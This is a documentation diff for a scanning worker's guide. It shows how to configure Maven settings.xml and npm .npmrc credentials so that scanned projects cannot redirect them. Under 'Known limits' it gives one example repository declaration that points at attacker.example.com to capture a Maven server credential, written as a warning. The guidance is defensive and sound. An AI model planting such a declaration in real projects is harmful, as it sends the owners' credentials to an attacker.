@@ -41,6 +41,56 @@ cannot become an arbitrary-file-read: nothing about a project or a scan
 request chooses what gets mounted there, only the operator's deployment
 configuration does.
 
+## Example file contents
+
+### `settings.xml` (Maven)
+
+Maven decides which `<server>` credential to send for a given repository
+lookup by matching the repository's `<id>`, not its `<url>`. A `pom.xml` from
+the project being scanned can declare its own `<repository>` with whatever
+`<id>` and `<url>` it likes - if that `<id>` happens to match a `<server>` in
+your `settings.xml`, Maven cannot tell the declared repository apart from
+the real one and sends your credential to it. Do not rely on a bare
+`<server>` for this reason. Pin every lookup to one trusted URL with a
+`<mirror mirrorOf="*">` instead, so a project's own `<repository>`
+declarations are ignored and nothing is left for an `<id>` to redirect:
+
+```xml
+<settings>
+  <mirrors>
+    <mirror>
+      <id>internal-mirror</id>
+      <mirrorOf>*</mirrorOf>
+      <url>https://nexus.internal.example.com/repository/maven-public/</url>
+    </mirror>
+  </mirrors>
+  <servers>
+    <server>
+      <id>internal-mirror</id>
+      <username>svc</username>
+      <password>S3cret</password>
+    </server>
+  </servers>
+</settings>
+```
+
+See "Known limits" below for what happens if you skip the mirror and keep a
+bare `<server>`.
+
+### `.npmrc` (npm)
+
+Scope the credential to the exact registry host, using the
+`//host/path/:_authToken=` line form. An unscoped `_auth` or `_authToken`
+line applies to every registry npm resolves against for the install -
+including one the scanned project's own `package.json` names in a
+`publishConfig.registry` field - so never use the unscoped form for a
+credential you mount into the worker:
+
+```ini
+@myorg:registry=https://registry.internal.example.com/
+//registry.internal.example.com/:_authToken=${NPM_TOKEN}
+```
+
 ## Putting the files in
 
 ### With Docker Compose
@@ -160,6 +210,16 @@ an environment variable.
 
 ## Known limits
 
+- **A bare `<server>` in `settings.xml`, without the `<mirror mirrorOf="*">`
+  from the example above, is matched by `<id>`, not by `<url>`.** Maven
+  looks at the repository's `<id>` alone to decide which `<server>`
+  credential to send. A malicious `pom.xml` in the scanned project can
+  declare `<repository><id>internal-nexus</id><url>https://attacker.example.com/</url></repository>`;
+  if your `settings.xml` has a `<server>` whose `id` happens to be
+  `internal-nexus` (a plausible, commonly-chosen name), Maven sends that
+  credential to the attacker's URL instead of your real repository. The
+  `<mirror mirrorOf="*">` form pins every lookup to one URL regardless of
+  what the project declares - use it, not a bare `<server>`.
 - **One shared credential set per worker, not per project or team.** Unlike
   the container-image registry credentials (ER3), which are scoped per
   organisation and matched against the image being pulled, everything under
